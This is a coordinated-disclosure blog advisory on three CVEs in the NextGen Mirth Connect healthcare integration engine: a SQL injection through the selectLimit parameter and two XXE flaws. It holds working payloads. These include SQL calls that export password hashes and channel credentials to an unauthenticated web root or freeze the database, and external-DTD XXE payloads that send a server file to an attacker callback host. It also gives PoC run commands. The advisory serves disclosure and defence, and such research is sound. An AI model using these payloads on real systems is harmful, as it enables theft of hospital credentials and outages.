---
layout: post
title: "Exporting Mirth's Database and Reading Server Files: Three Flaws in NextGen Connect"
date: 2026-09-10 00:00:00 +0000
categories: [Security, Advisory]
tags: [nextgen-connect, mirth-connect, healthcare, sqli, xxe, denial-of-service, cwe-89, cwe-611, cve-2026-82583, cve-2026-78224, cve-2026-82578]
description: "Three network-reachable flaws in NextGen Mirth Connect: authenticated SQL injection that exports the configuration database and freezes bundled Derby until restart, plus two unauthenticated XXE paths. Tested on 4.5.2; CISA recommends 4.7.2 or later."
toc: true
pin: true
---

## Summary

[NextGen Connect](https://github.com/nextgenhealthcare/connect), formerly Mirth
Connect, is a healthcare integration engine. It sits between systems that exchange
HL7, FHIR, DICOM, X12, and other clinical data. Channels accept messages, transform
them, and route them onward to databases, file servers, APIs, and other healthcare
systems. If you have worked in a hospital IT environment, there is a decent chance
something like this is quietly moving your lab results around.

I found three network-reachable vulnerabilities in the 4.5.2 release:

| CVE | Finding | Entry point | Demonstrated impact | CVSS 3.1 / 4.0 | CISA guidance |
|---|---|---|---|---|---|
| [CVE-2026-82583](https://www.cve.org/CVERecord?id=CVE-2026-82583) | `selectLimit` SQL injection | Authenticated Database Connector API | Export password hashes and channel configuration to an unauthenticated web path; freeze the database until restart | **8.3 / 7.2 High** | 4.7.2+ |
| [CVE-2026-78224](https://www.cve.org/CVERecord?id=CVE-2026-78224) | XSLT Step XXE | Unauthenticated channel message | Read a server-local file over an OOB callback; deny service to the affected channel | **8.2 / 8.8 High** | 4.7.2+ |
| [CVE-2026-82578](https://www.cve.org/CVERecord?id=CVE-2026-82578) | XML Batch Adaptor XXE | Unauthenticated batched XML message | Read a server-local file over an OOB callback | **7.5 / 8.7 High** | 4.7.2+ |

[CISA's advisory ICSMA-26-253-01](https://www.cisa.gov/news-events/ics-medical-advisories/icsma-26-253-01)
lists both CVSS 3.1 and CVSS 4.0. The paired scores are not numerically comparable.

Everything below was replayed against the official 4.5.2 container image:

```text
nextgenhealthcare/connect:4.5.2
sha256:4afa295cfe7c5ffd596efee69594157fea87202e33d66bb4a98a52db4598f836
```

NextGen privately reported fixing the XSLT issue in 4.7.1 and the SQL injection and
XML Batch issue in 4.7.2. CISA treats 4.7.1 and earlier as affected and recommends
4.7.2 or later. The findings are tracked as
CVE-2026-82583, CVE-2026-78224, and CVE-2026-82578, respectively. Releases after
4.5 are distributed directly by NextGen rather than through the public GitHub release stream.

Working exploit code and full x86-64 Linux transcripts are in
**[github.com/abhinavagarwal07/mirth-connect-security-poc](https://github.com/abhinavagarwal07/mirth-connect-security-poc)**.
Each PoC launches a fresh official image, attacks it from a separate container, and
exits nonzero unless the claimed effect actually happens.

> **Affected:** I tested 4.5.2. CISA lists 4.7.1 and earlier as affected. Upgrade to
> **4.7.2 or later**.
{: .prompt-danger }

---

## What an attacker gets

The SQL injection turns an authenticated API session into a configuration-database
export. That includes administrator password hashes and channel definitions holding
plaintext connector credentials for databases, file servers, mail relays, and
clinical endpoints. The export lands in a directory served without authentication,
and the same endpoint can freeze bundled Derby until restart.

The two XXE paths let an unauthenticated sender to an affected channel exfiltrate a
file readable by the Mirth service. The XSLT path can also stop the attacked channel.
The prerequisites and tested limits differ:

| Path | Attacker needs | Demonstrated result | Not claimed |
|---|---|---|---|
| Database Connector SQLi | Any authenticated API session in the open-source build; the stock replay uses `admin/admin` | Live password table written under `public_html` and fetched with no credentials; Derby frozen until process restart | Java code execution; auth bypass; behaviour of commercial RBAC extensions |
| XSLT XXE | Reach an exposed channel whose fixed XSLT Step parses inbound XML | Exact target-only canary returned through an attacker DTD callback; slow entity blocks the attacked channel | Whole-server outage; that a vulnerable XSLT channel exists by default |
| XML Batch XXE | Reach a channel with XML batch processing enabled in an XPath-backed split mode | Exact target-only canary returned through an attacker DTD callback | That batch processing is on by default; any measured availability impact |

## Where the attack surface is

Mirth has two network surfaces that behave nothing like each other. The findings
split across them.

The **admin plane** is the REST API on port 8443. It is how the desktop
administrator client, and anything scripted against it, configures the server. It
requires authentication. Finding 1 lives here.

The **data plane** is the listeners deployed channels open — HTTP, TCP, LLP, each on
its own port. They exist so other systems can push clinical messages in. These
listeners do not require Mirth authentication. Findings 2 and 3 live here.

Finding 1 requires an API login. Findings 2 and 3 do not require a Mirth account once
the affected listener is deployed and reachable. Restricting the admin plane does
not protect a vulnerable channel on the data plane.

## The lab

Every PoC in the repo has the same shape:

- The target is the official 4.5.2 image, digest-pinned, started fresh per run.
- The attacker is a separate `python:3.11-slim` container.
- Both sit on a `--internal` Docker bridge with a unique name. No Mirth port is
  published to the host, and the target has no route off that bridge.
- A random canary is bind-mounted read-only into the target at
  `/tmp/mirth-poc-canary.txt`. The exploit only passes if that exact string comes
  back out.
- Channel fixtures are installed through Mirth's real REST API, not by editing
  files on disk.
- Cleanup removes only the containers and network that invocation created.

Those constraints are the point. A payload that reaches a parser proves nothing. A
payload that comes back carrying a secret only the target could have known is a
different claim.

## 1. CVE-2026-82583: Database Connector `selectLimit` injection

### The endpoint

The Database Connector has a metadata helper the admin client calls when you click
around picking tables. It is a JAX-RS operation, and every interesting parameter
comes from the caller:

```java
// abridged: OpenAPI @Operation/@ApiResponse and per-parameter
// @Param/@Parameter annotations removed for readability
@POST
@Path("/_getTables")
@MirthOperation(name = "getTables", display = "Get Tables", type = ExecuteType.ASYNC, auditable = false)
public SortedSet<Table> getTables(
        @QueryParam("channelId") String channelId,
        @QueryParam("channelName") String channelName,
        @QueryParam("driver") String driver,
        @QueryParam("url") String url,
        @QueryParam("username") String username,
        @QueryParam("password") String password,
        @QueryParam("tableNamePattern") Set<String> tableNamePatterns,
        @DefaultValue("SELECT * FROM ? LIMIT 1") @QueryParam("selectLimit") String selectLimit,
        @QueryParam("resourceId") Set<String> resourceIds) throws ClientException;
```

Source: [`DatabaseConnectorServletInterface.java` lines 45-63](https://github.com/nextgenhealthcare/connect/blob/6ce3a9f0e3d84841f0b1e07c2808cf0bdb3d0a78/server/src/com/mirth/connect/connectors/jdbc/DatabaseConnectorServletInterface.java#L45-L63).

Two things to notice. First, `driver` and `url` are attacker-chosen, so the caller
decides which database this thing connects to. Second, that `@MirthOperation`
carries no `permission` attribute at all. Compare it with operations elsewhere in
the tree that do declare one. Nothing here says "you must hold a channel or settings
right to call me."

In the open-source build that gap goes all the way down. The
[`DefaultAuthorizationController`](https://github.com/nextgenhealthcare/connect/blob/6ce3a9f0e3d84841f0b1e07c2808cf0bdb3d0a78/server/src/com/mirth/connect/server/controllers/DefaultAuthorizationController.java#L40-L46)
returns "authorized" for every request that got past login. Commercial authorization
extensions may layer policy on top that is not in this tree. Within the code that
ships publicly, any authenticated account reaches this endpoint.

### The injection

`selectLimit` exists so drivers can supply an efficient "give me one row so I can
read its `ResultSetMetaData`" query. The server takes that string, substitutes each
`?` with a table name, and runs it:

```java
final String schemaTableName = StringUtils.isNotEmpty(schema)
        ? "\"" + schema + "\".\"" + tableName + "\""
        : "\"" + tableName + "\"";
final String queryString = selectLimit.trim().replaceAll(
        "\\?", Matcher.quoteReplacement(schemaTableName));
Statement statement = connection.createStatement();
try {
    rs = statement.executeQuery(queryString);
    ResultSetMetaData rsmd = rs.getMetaData();
    // ...
} catch (SQLException sqle) {
    logger.info("Failed to execute '" + queryString + "', fall back to generic approach to retrieve column information");
    fallback = true;
}
```

Source: [`DatabaseConnectorServlet.java` lines 167-181](https://github.com/nextgenhealthcare/connect/blob/6ce3a9f0e3d84841f0b1e07c2808cf0bdb3d0a78/server/src/com/mirth/connect/connectors/jdbc/DatabaseConnectorServlet.java#L167-L181).

No grammar check, no allowlist, no prepared statement. Whatever you send is what
runs. `Matcher.quoteReplacement` is there to stop `$` and `\` in the *table name*
from being interpreted as regex replacement syntax — it is not a sanitiser for the
query text, and there is nothing sanitising the query text.

That `catch` block is the interesting part. A
`SQLException` is swallowed and the code quietly falls back to
`DatabaseMetaData.getColumns()`. So the endpoint returns a perfectly normal HTTP 200
with a perfectly normal table listing, whether your injected SQL succeeded or blew
up. From the outside, a successful attack and a boring metadata lookup look
identical. The only trace is an INFO-level log line.

One more mechanical detail: this runs inside a loop over every table matched by
`tableNamePattern`. Send `tableNamePattern=%` and your payload executes once per
table in the database. Usually that is harmless noise: the first call does the work and the rest fail into
the fallback path. It matters if your payload is not idempotent.

### Reaching the config database

Because `driver` and `url` come from the request, an attacker does not need an
external database to point at. Mirth 4.5.2 ships an embedded Apache Derby instance
holding its own configuration, and its path inside the container is fixed. So you
just point the endpoint back at Mirth's own brain:

```text
driver = org.apache.derby.jdbc.EmbeddedDriver
url    = jdbc:derby:/opt/connect/appdata/mirthdb
```

The full request looks like this:

```http
POST /api/connectors/jdbc/_getTables?channelId=poc&channelName=poc
    &driver=org.apache.derby.jdbc.EmbeddedDriver
    &url=jdbc%3Aderby%3A%2Fopt%2Fconnect%2Fappdata%2Fmirthdb
    &username=&password=&tableNamePattern=%25
    &selectLimit=<URL-ENCODED PAYLOAD> HTTP/1.1
Host: target:8443
Authorization: Basic YWRtaW46YWRtaW4=
X-Requested-With: OpenAPI
Content-Type: application/xml
Content-Length: 0
```

(Line-wrapped for readability; it is one query string. The parameters are query
parameters even though the method is POST, because that is how `@QueryParam` binds.)

### Getting data out

Derby exposes system procedures that write query results straight to a file. That
turns "I can run SQL" into "I can write a file the web server will serve." The
payload, decoded:

```sql
CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY(
  'SELECT P.USERNAME, PP.PASSWORD, PP.PASSWORD_DATE
     FROM APP.PERSON P
     INNER JOIN APP.PERSON_PASSWORD PP ON P.ID = PP.PERSON_ID',
  '/opt/connect/public_html/mirth-poc-<random>.csv',
  null, null, null)
```

A `CALL` is not a query, so `executeQuery()` eventually throws `X0Y78` ("statement
does not return a result set"). But Derby has already run the procedure by then.
The exception lands in that `catch (SQLException)` block, the endpoint returns 200,
and the CSV is sitting on disk.

`/opt/connect/public_html` is Mirth's static web root, served **without
authentication**. So the second request needs no credentials at all:

```text
database_api_baseline_status=200
vulnerable_endpoint=/api/connectors/jdbc/_getTables
database_url=jdbc:derby:/opt/connect/appdata/mirthdb
export_path=/opt/connect/public_html/mirth-poc-8dbb04e6284d4be59a6c87e47bc18737.csv
injection_http_status=200
unauthenticated_fetch_status=200
"admin","b8cA3mDkavInMc2JBYa6/C3EGxDp7ppqh7FsoXx0x8+3LWK3Ed3ELg==","2026-09-08 19:11:16.967"
PASS: authenticated SQL injection exported the password table and the result was fetched without authentication
```

That is the live admin password hash out of `PERSON_PASSWORD`, retrieved anonymously.
Same trick works on any table. In separate runs I exported `CONFIGURATION` (every
server setting), the whole `CHANNEL` table (24 KB of serialized channel XML), and via
`SYSCS_UTIL.SYSCS_BACKUP_DATABASE` a complete 3.8 MB copy of the database — all of it
readable over plain HTTP from the web root.

### The part that makes it worse: cleartext connector passwords

Exporting `CHANNEL` matters more than it first looks, and this is a separate bug
worth stating on its own.

Mirth 4.5.2 serializes connector configuration into `CHANNEL.CHANNEL` as XML — and
connector passwords go in as **cleartext**. No `{enc}` wrapper, no key involved.
`DefaultChannelController`'s insert and update paths never run the configured
`Encryptor` over channel content.

I confirmed this at runtime rather than inferring it from the code. I configured a
Database Writer destination pointing at a fake downstream EHR, with a canary
password, then exported the `CHANNEL` table through the injection. This is what came
back, unmodified except for line wrapping:

```xml
<driver>Please Select One</driver>
<url>jdbc:postgresql://downstream-ehr.example.internal:5432/patients</url>
<username>svc_mirth_canary</username>
<password>CHAIN_A_CANARY_pw_9x!Kq</password>
<query>INSERT INTO audit_log (msg) VALUES (${message.encodedData})</query>
```

Hostname, username, password, and the query it runs. Everything you would need to
connect to that database yourself.

This one came from a separate manual run rather than the packaged harness. Same
`SYSCS_EXPORT_QUERY` call as above, aimed at `CHANNEL` instead of `PERSON_PASSWORD`.

So the injection does not just leak an admin hash you would still have to crack. It
leaks working credentials for whatever the operator connected Mirth to — external
databases, SFTP drop boxes, SMTP relays, EHR endpoints. In a hospital network, that
is the part that matters and why the confidentiality impact is high.

That is what turns a config-database read into lateral movement. It is also a
[CWE-312](https://cwe.mitre.org/data/definitions/312.html) issue independent of the injection.

I proved the credentials come out in the clear. I did not connect to any downstream
system.

### Persistent database denial of service

The same sink takes:

```sql
CALL SYSCS_UTIL.SYSCS_FREEZE_DATABASE()
```

Derby stops servicing the database. Mirth's non-DB endpoints keep answering, and
everything backed by the database hangs:

```text
freeze_request=timed_out
non_database_api_status=200
database_api_post_freeze_attempt_1=timed_out
database_api_post_freeze_attempt_2=timed_out
database_api_post_freeze_attempt_3=timed_out
unfreeze_via_injection=timed_out_before_call_could_complete
database_api_after_unfreeze_attempt=timed_out
```

The nice detail is that last pair of lines. `SYSCS_UNFREEZE_DATABASE` exists, but you
cannot reach it through this vector — `_getTables` enumerates tables *before* it runs
your `selectLimit`, and that enumeration needs the database that is now frozen. The
attacker has locked the door and left the key inside. Recovery is a process restart,
which the harness then verifies:

```text
target_restart=begin
target_ready=true
database_api_post_restart_status=200
PASS: target restart restored DB-backed API availability
```

### What did not work, and why

The obvious next thought is Derby's `SQLJ.INSTALL_JAR` → `CREATE FUNCTION` → `VALUES`
path to Java execution. I tested it end to end. It does not work, and the reason
draws a clean line around what this bug can and cannot do.

`executeQuery()` throws before the statement's transaction commits. Anything Derby
handles *transactionally* is therefore rolled back. Anything that escapes to the OS
before the throw survives.

| # | Technique | Result | Why |
|---|---|---|---|
| 1 | `CREATE TABLE` (DDL) | Fails | rolled back — no commit |
| 2 | `INSERT` (DML) | Fails | rolled back — no commit |
| 3 | `SYSCS_FREEZE_DATABASE` | **Works** | non-transactional engine state |
| 4 | `INSTALL_JAR` → `CREATE FUNCTION` → `VALUES` | Fails | every step is transactional |
| 5 | `SYSCS_EXPORT_QUERY` | **Works** | filesystem write escapes the transaction |
| 6 | Overwrite an existing file | Fails | Derby refuses to clobber |
| 7 | `SYSCS_BACKUP_DATABASE` | **Works** | filesystem write, 3.8 MB full backup |
| 8 | Write to an arbitrary path | **Works** | `/tmp/`, `public_html/`, `custom-lib/` — CSV/backup formats only |

Database property writes and `SYSFILES`/`SYSALIASES` inserts fall in the same
transactional bucket as rows 1, 2 and 4.

So: arbitrary file *write* yes, but only in formats Derby produces, and only to paths
that do not already exist. No `.jar` you control, no classpath change that sticks, no
code execution. The finding is serious enough without inventing an RCE, and claiming
one would have been wrong.

**CVE-2026-82583** · **CVSS 3.1:** 8.3 High (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:H`) · **CVSS 4.0:** 7.2 High (`CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:H/SC:N/SI:N/SA:N`) · [CWE-89](https://cwe.mitre.org/data/definitions/89.html), with
[CWE-312](https://cwe.mitre.org/data/definitions/312.html) as the amplifier.
{: .prompt-tip }

> **Tested affected:** 4.5.2. **CISA guidance:** upgrade to 4.7.2 or later.
{: .prompt-info }

## 2. CVE-2026-78224: Unauthenticated XXE in the XSLT Step

### The code

Mirth's XSLT transformer step does not call the XML APIs directly. It *generates
JavaScript*, which Rhino then runs at message-processing time:

```java
private String getTransformationScript() {
    StringBuilder script = new StringBuilder();
    if (useCustomFactory && StringUtils.isNotEmpty(customFactory)) {
        script.append("tFactory = Packages.javax.xml.transform.TransformerFactory.newInstance(\"" + customFactory + "\", null);\n");
    } else {
        script.append("tFactory = Packages.javax.xml.transform.TransformerFactory.newInstance();\n");
    }
    script.append("xsltTemplate = new Packages.java.io.StringReader(" + template + ");\n");
    script.append("transformer = tFactory.newTransformer(new Packages.javax.xml.transform.stream.StreamSource(xsltTemplate));\n");
    script.append("sourceVar = new Packages.java.io.StringReader(" + sourceXml + ");\n");
    script.append("resultVar = new Packages.java.io.StringWriter();\n");
    script.append("transformer.transform(new Packages.javax.xml.transform.stream.StreamSource(sourceVar), new Packages.javax.xml.transform.stream.StreamResult(resultVar));\n");
    return script.toString();
}
```

Source: [`XsltStep.java` lines 61-76](https://github.com/nextgenhealthcare/connect/blob/6ce3a9f0e3d84841f0b1e07c2808cf0bdb3d0a78/server/src/com/mirth/connect/plugins/xsltstep/XsltStep.java#L61-L76).

Read the emitted script. `TransformerFactory.newInstance()`, then straight to
`newTransformer` and `transform`. Nothing sets `FEATURE_SECURE_PROCESSING`. Nothing
sets `ACCESS_EXTERNAL_DTD` or `ACCESS_EXTERNAL_STYLESHEET` to the empty string. It is
a stock JAXP factory, which means external entities resolve by default.

Mirth *does* know how to harden a transformer factory. It does it in other places,
including sixty lines below the bug in finding 3. This one just got missed.

### Why this is a real path and not a lab curiosity

The easy version of this bug would be "attacker supplies the stylesheet," which
nobody would care about, because supplying a stylesheet already implies you own the
config. That is not what happens here.

The fixture I use is deliberately boring, and matches how people actually configure
this step:

```xml
<com.mirth.connect.plugins.xsltstep.XsltStep version="4.5.2">
  <name>XSLT Identity Transform</name>
  <sourceXml>connectorMessage.getRawData()</sourceXml>
  <resultVariable>xsltResult</resultVariable>
  <template>'&lt;xsl:stylesheet version="1.0" ...&gt;&lt;xsl:copy-of select="."/&gt;...'</template>
  <useCustomFactory>false</useCustomFactory>
</com.mirth.connect.plugins.xsltstep.XsltStep>
```

The stylesheet is fixed and admin-installed. `useCustomFactory` is false. The only
thing the attacker controls is `sourceXml` — which is `connectorMessage.getRawData()`,
the raw inbound message. That is the ordinary way to apply an XSLT to incoming data.

Attach it to an HTTP Listener and the attacker's entire contribution is an
unauthenticated POST body.

### The payload

The message itself is short:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % remote SYSTEM "http://attacker:8888/payload.dtd">
%remote;
]><data>probe</data>
```

The real work is in the external DTD, because a parameter entity cannot be expanded
inside another entity's value in the internal subset. So the exfiltration is staged
in two steps, out in the external DTD where that restriction does not apply:

```xml
<!ENTITY % file  SYSTEM "file:///tmp/mirth-poc-canary.txt">
<!ENTITY % stage "<!ENTITY &#x25; leak SYSTEM 'http://attacker:8888/leak?data=%file;'>">
%stage;
%leak;
```

`%file` reads the target-local file. `%stage` builds a *new* entity declaration with
the file contents already substituted into the URL. `%leak` then fires that URL at
the attacker's listener. Classic OOB XXE — the file never has to appear in any
response the attacker can see.

### The run

The harness first sends a benign message with no DOCTYPE, and fails if that causes a
callback. Then the real payload:

```text
negative_no_doctype_status=200
PASS: no-DOCTYPE negative arm caused no external-entity callback
listener_http_status=200
oob_leak='MIRTH_XSLT_XXE_CANARY_20260908T191620Z-21867-2887-28840'
PASS: unauthenticated listener input exfiltrated a target-local file through XSLT parsing
```

That canary was generated at run time and existed only inside the target container.
Getting it back over the attacker's HTTP listener is the proof. Note also that the
secret came out of the *callback*, not out of an authenticated message-history read —
this is a genuine unauthenticated file read, not a read that quietly needs admin
access to observe.

Practical limits, stated plainly: this transport carries single-line text well.
Multi-line files break the URL-based leak, though they are recoverable through the
in-band path when the channel is configured to return the transformation result.

### The availability side, and where it stops

The same parser will happily wait on a slow external entity. Mirth's source
connectors default to `processingThreads = 1`
([`SourceConnectorProperties.java` lines 80-92](https://github.com/nextgenhealthcare/connect/blob/6ce3a9f0e3d84841f0b1e07c2808cf0bdb3d0a78/donkey/src/main/java/com/mirth/connect/donkey/model/channel/SourceConnectorProperties.java#L80-L92)),
so one attacker holding one entity open is enough to stop that channel dead.

The harness tests whether this scales into a whole-server outage. It does not. It
stands up a second identical channel on another port, holds one slow entity against
the victim, and then checks all three surfaces:

```text
availability_baseline_victim=200 control=200 admin=200
slow_entity_target_connected=true
victim_probe_1=timed_out
isolation_control_1_status=200 admin_status=200
victim_probe_2=timed_out
isolation_control_2_status=200 admin_status=200
victim_probe_3=timed_out
isolation_control_3_status=200 admin_status=200
slow_entity_attack_result={'status': 200}
victim_recovery_status=200
```

Victim dead, bystander channel fine, admin API fine, and full recovery the moment the
entity is released. I pushed this further outside the packaged harness — 1, 10, 50 and
roughly 200 concurrent slow-entity connections. Same result every time. JVM thread
count climbed from 68 to 261, CPU stayed under 5%, and the blast radius never left
the attacked channel.

The reason is structural. Every HTTP Listener builds its **own** Jetty `Server`
([`HttpReceiver.java` line 221](https://github.com/nextgenhealthcare/connect/blob/6ce3a9f0e3d84841f0b1e07c2808cf0bdb3d0a78/server/src/com/mirth/connect/connectors/http/HttpReceiver.java#L221)),
and the admin API's
[`MirthWebServer`](https://github.com/nextgenhealthcare/connect/blob/6ce3a9f0e3d84841f0b1e07c2808cf0bdb3d0a78/server/src/com/mirth/connect/server/MirthWebServer.java#L123)
is a separate `Server` again. There is no shared thread pool to exhaust. The measured
availability impact is channel-local, not server-wide.

**CVE-2026-78224** · **CVSS 3.1:** 8.2 High (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L`) · **CVSS 4.0:** 8.8 High (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:L/SC:N/SI:N/SA:N`) ·
[CWE-611](https://cwe.mitre.org/data/definitions/611.html).
{: .prompt-tip }

> **Tested affected:** 4.5.2. **Fix guidance:** NextGen privately reported a 4.7.1 fix; CISA recommends 4.7.2 or later.
{: .prompt-info }

## 3. CVE-2026-82578: Unauthenticated XXE in the XML Batch Adaptor

Different parser, different feature, same root cause — and this one has the cleanest
illustration of the mistake anywhere in the codebase.

### The code

When a channel uses the XML data type with batch processing, `XMLBatchAdaptor` splits
the incoming batch into individual messages. For the `Element Name`, `Level`, and
`XPath Query` split modes it does that with XPath, evaluated directly against the raw
listener stream:

```java
if (splitType == SplitType.Element_Name) {
    query.append("//*[local-name()='");
    query.append(batchProperties.getElementName());
    query.append("']");
} else if (splitType == SplitType.Level) {
    // ...
} else if (splitType == SplitType.XPath_Query) {
    query.append(batchProperties.getQuery());
}

XPath xpath = xPathFactory.newXPath();
nodeList = (NodeList) xpath.evaluate(
        query.toString(), new InputSource(bufferedReader), XPathConstants.NODESET);
```

The factory is the default one, built at field initialisation:

```java
private XPathFactory xPathFactory = XPathFactory.newInstance();
```

Sources: the field declaration is
[line 64](https://github.com/nextgenhealthcare/connect/blob/6ce3a9f0e3d84841f0b1e07c2808cf0bdb3d0a78/server/src/com/mirth/connect/plugins/datatypes/xml/XMLBatchAdaptor.java#L64); the split/evaluate block is
[lines 114-130](https://github.com/nextgenhealthcare/connect/blob/6ce3a9f0e3d84841f0b1e07c2808cf0bdb3d0a78/server/src/com/mirth/connect/plugins/datatypes/xml/XMLBatchAdaptor.java#L114-L130).

Handing an `InputSource` to `XPath.evaluate` makes JAXP build a document internally,
using default settings. DOCTYPE allowed, external entities resolved.

Now look at what sits about sixty lines below it, in the same file:

```java
private String toXML(Node node) throws Exception {
    Writer writer = new StringWriter();
    TransformerFactory tf = TransformerFactory.newInstance();
    tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
    tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
    // ...
```

Source: [lines 190-196](https://github.com/nextgenhealthcare/connect/blob/6ce3a9f0e3d84841f0b1e07c2808cf0bdb3d0a78/server/src/com/mirth/connect/plugins/datatypes/xml/XMLBatchAdaptor.java#L190-L196).

The *output* path — serialising a node the parser already trusted — is hardened. The
*input* path, the one that touches attacker data, is not. Somebody knew the right
incantation and applied it in the wrong place.

### The fixture and the payload

Nothing exotic in the channel config — the product's ordinary XML `Element Name`
batch mode on an HTTP Listener:

```xml
<processBatch>true</processBatch>
...
<inboundDataType>XML</inboundDataType>
<batchProperties class="com.mirth.connect.plugins.datatypes.xml.XMLBatchProperties">
  <splitType>Element_Name</splitType>
  <elementName>message</elementName>
  <level>1</level>
</batchProperties>
```

The attacker supplies the whole batch body, unauthenticated:

```xml
<?xml version="1.0"?>
<!DOCTYPE batch [
<!ENTITY % remote SYSTEM "http://attacker:8888/payload.dtd">
%remote;
]><batch><message>probe</message></batch>
```

The external DTD is the same two-stage parameter-entity trick as finding 2.

### The run

```text
listener_result=HTTPError: HTTP Error 500: Server Error
oob_leak='MIRTH_XML_BATCH_XXE_CANARY_20260908T191238Z-20769-17783-31203'
PASS: unauthenticated batch input exfiltrated a target-local file through XMLBatchAdaptor
```

Look at the first two lines together. On 4.5.2 the request errors out with a 500
after parsing fails — but the callback has *already* delivered the file. If you
were testing this from the outside and only watched status codes, you would write it
off as a crash. The exploit asserts on the canary arriving at the listener and ignores the
status code entirely.

Batch processing is off by default, so this only affects deployments where an
operator turned it on. That constraint is why this one scores lowest of the three. It is also the only one of the three where the split mode matters:
`JavaScript` splitting takes a different code path entirely.

**CVE-2026-82578** · **CVSS 3.1:** 7.5 High (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`) · **CVSS 4.0:** 8.7 High (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`) ·
[CWE-611](https://cwe.mitre.org/data/definitions/611.html).
{: .prompt-tip }

> **Tested affected:** 4.5.2. **CISA guidance:** upgrade to 4.7.2 or later.
{: .prompt-info }

## What the fixes look like

The 4.7.x source is not public. These are the hardening patterns I would use, not a
description of NextGen's patches.

Both XXE issues are a few lines each. For the XSLT step, the generated script needs to
harden the factory before it is used:

```java
script.append("tFactory.setFeature(Packages.javax.xml.XMLConstants.FEATURE_SECURE_PROCESSING, true);\n");
script.append("tFactory.setAttribute(Packages.javax.xml.XMLConstants.ACCESS_EXTERNAL_DTD, '');\n");
script.append("tFactory.setAttribute(Packages.javax.xml.XMLConstants.ACCESS_EXTERNAL_STYLESHEET, '');\n");
```

Better still, do the transform in Java and stop emitting XML plumbing as generated
JavaScript at all.

For the batch adaptor, `XPath.evaluate(String, InputSource, QName)` gives you no way
to configure the parser it builds internally, so the fix is to stop using that
overload. Parse with a `DocumentBuilderFactory` you control, then evaluate XPath
against the resulting `Document`:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
Document doc = dbf.newDocumentBuilder().parse(new InputSource(bufferedReader));
nodeList = (NodeList) xpath.evaluate(query.toString(), doc, XPathConstants.NODESET);
```

The SQL injection needs more than a patch to one line:

1. Drop `selectLimit` from the API and use `DatabaseMetaData.getColumns()`, which the
   code already falls back to anyway. If per-driver queries have to stay, keep them
   server-side keyed by driver rather than accepting the text from the caller.
2. Put a permission on the `@MirthOperation`. Reading arbitrary database metadata
   through a caller-supplied JDBC URL should not be available to every logged-in
   account.
3. Constrain `driver` and `url` to configured resources instead of letting the caller
   name any class and any connection string.

## Reproducing

> **These are working exploits.** Run them only in a disposable environment you own.
> The SQL test deliberately freezes the target database until the target is
> restarted. The harness publishes no Mirth port to the host.
{: .prompt-warning }

On an x86-64 Linux host with Bash and Docker:

```bash
git clone https://github.com/abhinavagarwal07/mirth-connect-security-poc
cd mirth-connect-security-poc

./run-all.sh
```

Each finding also runs on its own:

```bash
./sql-selectlimit-injection/poc/run.sh
./xslt-step-xxe/poc/run.sh
./xml-batch-xxe/poc/run.sh
```

A run prints `PASS` only after the actual consequence is observed: the anonymously
retrieved credential export, the database availability boundary, or the exact
target-only file contents arriving in the attacker's callback. Every other outcome
is a nonzero exit.

The exploits also have standalone modes for an authorised target you already have
permission to test:

```bash
python3 sql-selectlimit-injection/poc/exploit.py \
  --target https://target.example:8443 --username api-user --password 'password'

python3 xslt-step-xxe/poc/exploit.py \
  --target http://target.example:9999/ \
  --callback-host attacker.example \
  --file-uri file:///etc/hostname
```

`--confirm-dos` is opt-in and lab-only — it freezes the target's database.

## Disclosure

I reported the three findings privately on 2026-07-10 and offered the PoCs and logs
to NextGen. On 2026-07-12, NextGen acknowledged the report and said the XSLT issue
was already fixed in 4.7.1. On 2026-08-05, it confirmed that the SQL injection and
XML Batch issue were fixed in 4.7.2.

The [last release in the public GitHub stream is 4.5.2](https://github.com/nextgenhealthcare/connect/releases), and NextGen's
[FAQ](https://github.com/nextgenhealthcare/connect/wiki/Frequently-Asked-Questions)
confirms that 4.6 onward is proprietary with release notes distributed through their
Success Community. The findings are mapped to CVE-2026-82583 (SQL injection),
CVE-2026-78224 (XSLT Step XXE), and CVE-2026-82578 (XML Batch Adaptor XXE).

### Prior work on the XSLT issue

I independently discovered this finding, but I was not the first to report it.

Per NextGen, a researcher going by **Youngdu** reported that issue to them on
2026-02-24 — months before my report — and that is the report the 4.7.1 fix came from.

Separately, **Satish Singh** filed public GitHub issue
[#6527](https://github.com/nextgenhealthcare/connect/issues/6527) on 2026-03-23,
which names `XsltStep.java` and the bare `TransformerFactory.newInstance()` call from
source review.

What I add on that finding is the runtime half: an end-to-end unauthenticated channel
path, actual file exfiltration through an OOB callback, and a measured availability
boundary that rules out the server-wide DoS. Findings 1 and 3 are mine.

## Disclosure timeline

| Date | Event |
|---|---|
| 2026-07-10 | Reported three findings to NextGen. Set public disclosure for August 24 (45 days) and offered PoCs and logs privately. |
| 2026-07-12 | NextGen acknowledged the report. Finding 2 was already fixed in 4.7.1; findings 1 and 3 were scheduled for fixes. |
| 2026-08-05 | NextGen confirmed findings 1 and 3 fixed in 4.7.2 and finding 2 fixed in 4.7.1. |
| 2026-08-05 | Told NextGen I planned a technical write-up and PoC after coordination; offered the draft for review. |
| 2026-08-14 | CISA ICS received the report; VU#656351 opened. |
| 2026-08-17 | Reaffirmed the August 24 disclosure date; NextGen requested September 24. |
| 2026-08-17 | Extended disclosure to September 7 for CVE and validation coordination. |
| 2026-08-18 | NextGen accepted the September 7 target and moved coordination to CISA. |
| 2026-09-03 | CVE-2026-82583, CVE-2026-78224, and CVE-2026-82578 were assigned to the three findings. |
